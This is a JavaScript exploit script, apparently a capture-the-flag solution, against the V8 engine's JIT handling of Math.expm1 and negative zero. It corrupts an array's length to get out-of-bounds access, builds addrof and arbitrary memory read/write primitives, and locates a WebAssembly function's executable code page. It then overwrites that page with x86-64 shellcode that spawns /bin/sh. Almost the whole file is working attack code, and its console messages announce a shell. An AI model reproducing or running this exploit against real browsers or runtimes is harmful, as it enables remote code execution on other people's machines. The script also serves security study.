var arrs=new Array();
var objs=new Array();
var bufs=new Array();
var flag = 0

function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

function foo(x) {

    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    let a = [0.1, 0.2, 0.3, 0.4];

    arrs.push([0.4, 0.5]); // OOB array
	objs.push({marker: 0x41414141, obj: {}}); // victim object
	bufs.push(new ArrayBuffer(0x41)); // victim buffer



	let new_size = (new Int64("7fffffff00000000")).asDouble();
	for (let i = 4; i < 200; i++) {
	    let val = a[b*i]; 	    
	    let is_backing = a[b*(i+1)] === 0.4;
	    let orig_size = Int64.fromDouble(val).toString();
	    let good = (orig_size === "0x0000000200000000" && !is_backing);
	    a[b*i*good] = new_size;
	    if (good){
	    	console.log("[+] found JSArray Size");
	        break;}
	}
}

foo(0);
console.log("wait for 10000");
for(let i = 0; i < 10000; i++){
console.log("[*] "+i+" times finished");
    foo("0");
}
	console.log("[+] 10000 times finished");
flag = 1;
foo(-0);

let oob_arr = null;
for (let i = 0; i < arrs.length; i++) {
    if (arrs[i].length !== 2) {
        oob_arr = arrs[i];
        break;
    }
}
console.log("[+] found OOB JSArray");

let victim_obj = null;
let victim_obj_idx_obj = null;
for (let i = 0; i < 100; i++) {
    let val = Int64.fromDouble(oob_arr[i]).toString();
    if (val === "0x4141414100000000") {
    	console.log("[+] found victim object marker");
        oob_arr[i] = (new Int64("4242424200000000")).asDouble();
        victim_obj_idx_obj = i + 1;
        break;
    }
}
for (let i = 0; i < objs.length; i++) {
    if (objs[i].marker == 0x42424242) {
        victim_obj = objs[i];
        console.log("[+] found victim object");
        break;
    }
}

let victim_buf = null;
let victim_buf_idx_ptr = null;
for (let i = 0; i < 100; i++) {
    let val = Int64.fromDouble(oob_arr[i]).toString();
    if (val === "0x0000000000000041") {
        oob_arr[i] = (new Int64("7fffffff")).asDouble();
        victim_buf_idx_ptr = i + 1;
        break;
    }
}
for (let i = 0; i < bufs.length; i++) {
    if (bufs[i].byteLength !== 0x41) {
        victim_buf = bufs[i];
        console.log("[+] found victim buffer");
        break;
    }
}

function addrof(obj) {
    victim_obj.obj = obj;
    return Int64.fromDouble(oob_arr[victim_obj_idx_obj]);
}
function read(addr, size) {
    oob_arr[victim_buf_idx_ptr] = addr.asDouble();
    let a = new Uint8Array(victim_buf, 0, size);
    return Array.from(a);
}
function write(addr, bytes) {
    oob_arr[victim_buf_idx_ptr] = addr.asDouble();
    let a = new Uint8Array(victim_buf);
    a.set(bytes);
}

//let wasm_code = new Uint8Array([...]);
/*
let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,16,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports.p4nda;
*/

function utf8ToString(h, p) {
  let s = "";
  for (i = p; h[i]; i++) {
    s += String.fromCharCode(h[i]);
  }
  return s;
}


var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);
  var wasmImports = {
    env: {
      puts: function puts (index) {
        console.log(utf8ToString(h, index));
      }
    }
  };
let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
let h = new Uint8Array(m.exports.memory.buffer);
let f = m.exports.p4nda;
f();
let f_addr = addrof(f);


console.log("[+] JSFuction addr :"+f_addr);


SharedFunctionInfo_addr = Int64.fromDouble(Struct.unpack(Struct.float64, read(Add(f_addr,0x17),8)));
console.log("[+] SharedFunctionInfo addr :"+SharedFunctionInfo_addr);

WasmExportedFunctionData_addr = Int64.fromDouble(Struct.unpack(Struct.float64, read(Add(SharedFunctionInfo_addr,0x7),8)));
console.log("[+] WasmExportedFunctionData addr :"+WasmExportedFunctionData_addr);

WasmInstanceObject_addr = Int64.fromDouble(Struct.unpack(Struct.float64, read(Add(WasmExportedFunctionData_addr,0xf),8)));
console.log("[+] WasmInstanceObject addr :"+WasmInstanceObject_addr);

jump_table_start_addr = Int64.fromDouble(Struct.unpack(Struct.float64, read(Add(WasmInstanceObject_addr,0xbf),8)));
console.log("[+] jump table start addr :"+jump_table_start_addr);

code_addr = Int64.fromDouble(Struct.unpack(Struct.float64, read(Add(jump_table_start_addr,0),8)));
console.log("[+] code addr :"+code_addr);

let shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5];
write(code_addr,shellcode);
console.log("[+] shellcode finished");

/*
function sleep(d){
  for(var t = Date.now();Date.now() - t <= d;);
}
sleep(5000);
*/
console.log("[+] trigger shellcode, enjoy your sh3ll:");
f();
//console.log(Int64.fromDouble(0.4).toString());


